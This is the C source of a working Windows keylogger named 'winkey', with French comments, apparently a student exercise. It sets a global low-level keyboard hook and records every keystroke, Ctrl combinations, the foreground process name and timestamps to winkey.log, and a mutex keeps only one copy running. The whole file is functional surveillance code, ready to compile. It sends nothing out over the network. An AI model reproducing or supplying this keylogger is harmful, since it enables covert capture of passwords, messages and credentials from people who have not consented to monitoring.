#include "winkey.h"

HWND lastWindow = NULL;
static int suppress_ctrl_up = 0;
static int ctrl_is_down = 0;

char *get_clean_process_name(const char* full_path) {
	const char* last_backslash = strrchr(full_path, '\\');
	if (last_backslash) {
		return (char*)(last_backslash + 1);
	}
	return (char*)full_path;
}

char* get_log_file_path(char* buffer, size_t buffer_size) {
	// recup path exe
	if (!GetModuleFileNameA(NULL, buffer, (DWORD)buffer_size)) {
		return NULL;
	}
	// trouver dernier \ et remplacer par null pr tronquer avec edge case si pas de '\'
	char* last_slash = strrchr(buffer, '\\');
	if (last_slash) {
		*last_slash = '\0';
	} else {
		strcpy_s(buffer, buffer_size, ".");
	}
	// construction du path (append winkey.log)
	strcat_s(buffer, buffer_size, "\\winkey.log");
	return buffer;
}

void LogKey(const char* keyOutput) {
	char winkey_path[MAX_PATH];
	if (!get_log_file_path(winkey_path, MAX_PATH)) {
		return;
	}
	// ouverture fichier et crée si existe pas
	FILE* file = fopen(winkey_path, "a");
	if (!file) return;

	HWND currentWindow = GetForegroundWindow();
	// log que le non du process et time si on change de fenetre
	if (currentWindow != lastWindow) {
		lastWindow = currentWindow;

		DWORD processId;
		GetWindowThreadProcessId(currentWindow, &processId);

		char full_name[MAX_PATH] = "Could not get process name";
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
		if (hProcess) {
			DWORD size = MAX_PATH;
			QueryFullProcessImageNameA(hProcess, 0, full_name, &size);
			CloseHandle(hProcess);
		}

		SYSTEMTIME time;
		GetLocalTime(&time);
		char* clean_name = get_clean_process_name(full_name);
		// ajout header process + timestamp
		fprintf(file, "\n\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'\n",
				time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond, clean_name);
	}

	fprintf(file, "%s", keyOutput);
	fclose(file);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode != HC_ACTION)
		return CallNextHookEx(NULL, nCode, wParam, lParam);

	KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
	DWORD vkCode = pKeyboard->vkCode;

	// touches detectés au keydown
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		// gestion CTRL
		if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
			ctrl_is_down = 1;
			return CallNextHookEx(NULL, nCode, wParam, lParam);
		}

		// gestion touche classique
		BYTE keyboardState[256] = {0};
		if (!GetKeyboardState(keyboardState)) {
			// si error continue avec default state = 0
		}

		// update status modificateurs
		keyboardState[VK_SHIFT]   = (GetKeyState(VK_SHIFT)  & 0x8000) ? 0x80 : 0;
		keyboardState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL)& 0x0001) ? 0x01 : 0;
		keyboardState[VK_CONTROL] = (GetKeyState(VK_CONTROL)& 0x8000) ? 0x80 : 0;
		keyboardState[VK_MENU]    = (GetKeyState(VK_MENU)   & 0x8000) ? 0x80 : 0;

		// récupération locale du process au premier plan
		HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));

		// récupération du caractère correspondant
		WCHAR unicodeBuffer[8] = {0};
		int result = ToUnicodeEx(vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 7, 0, keyboardLayout);

		// veif si CTRL est pressé
		int ctrlDown = ctrl_is_down || ((GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 1 : 0);
		if (ctrlDown) {
			// combinaison spéciales avec Ctrl
			if (vkCode == VK_RETURN) { suppress_ctrl_up = 1; LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
			else if (vkCode == VK_SPACE) { suppress_ctrl_up = 1; LogKey(" [CTRL+SPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
			else if (vkCode == VK_BACK) { suppress_ctrl_up = 1; LogKey(" [CTRL+BACKSPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
			else if (vkCode == VK_DELETE) { suppress_ctrl_up = 1; LogKey(" [CTRL+DELETE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }

			// si touche est lettre ou chiffre
			if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
				char comboBuf[8];
				comboBuf[0] = (char)vkCode;
				comboBuf[1] = '\0';
				char out[16];
				snprintf(out, sizeof(out), " [CTRL+%s] ", comboBuf);
				suppress_ctrl_up = 1;
				LogKey(out);
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			// obtenir un nom lisible via GetKeyNameTextA
			CHAR keyName[64] = {0};
			LONG lParamForName = (pKeyboard->scanCode << 16);
			if (pKeyboard->flags & LLKHF_EXTENDED) lParamForName |= 1<<24;
			if (GetKeyNameTextA(lParamForName, keyName, sizeof(keyName))) {
				char comboBuf[80];
				snprintf(comboBuf, sizeof(comboBuf), " [CTRL+%s] ", keyName);
				suppress_ctrl_up = 1;
				LogKey(comboBuf);
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			// si pas human readable, log code hexa
			char comboBufHex[32];
			snprintf(comboBufHex, sizeof(comboBufHex), " [CTRL+0x%lX] ", (unsigned long)vkCode);
			suppress_ctrl_up = 1;
			LogKey(comboBufHex);
			return CallNextHookEx(NULL, nCode, wParam, lParam);
		}

		// touches spéciales (sauf ctrl)
		if (vkCode == VK_RETURN) LogKey(" [ENTER]\n");
		else if (vkCode == VK_BACK) LogKey(" [BACKSPACE] ");
		else if (vkCode == VK_SPACE) LogKey(" ");
		else {
			if (result > 0) {
				if (result < 7) unicodeBuffer[result] = L'\0';
				char utf8Buffer[16] = {0};
				WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
				LogKey(utf8Buffer);
			}
		}
	}

	// gestion keyup pour les touches spéciales et donc laisser la prio au keydown pour les combos
	else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
		if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
			ctrl_is_down = 0;
			if (suppress_ctrl_up) {
				suppress_ctrl_up = 0;
			} else {
				LogKey(" [CTRL] ");
			}
		} else if (vkCode == VK_LMENU || vkCode == VK_RMENU) {
			LogKey(" [ALT] ");
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {
	// bloquer plusieurs exec paralleles du keylogger
	HANDLE handle_mutex = CreateMutex(NULL, TRUE, "keylogger_mutex");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {

		return 1;
	}

	printf("Keylogger started !\n");
	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0); // WH_KEYBOARD_LL pour hook global, NULL pour module actuel, 0 pour tous les threads
	if (hHook == NULL) {
		printf("Failed to set hook: %ld\n", GetLastError());
		ReleaseMutex(handle_mutex);
		return 1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	ReleaseMutex(handle_mutex);
	return 0;
}
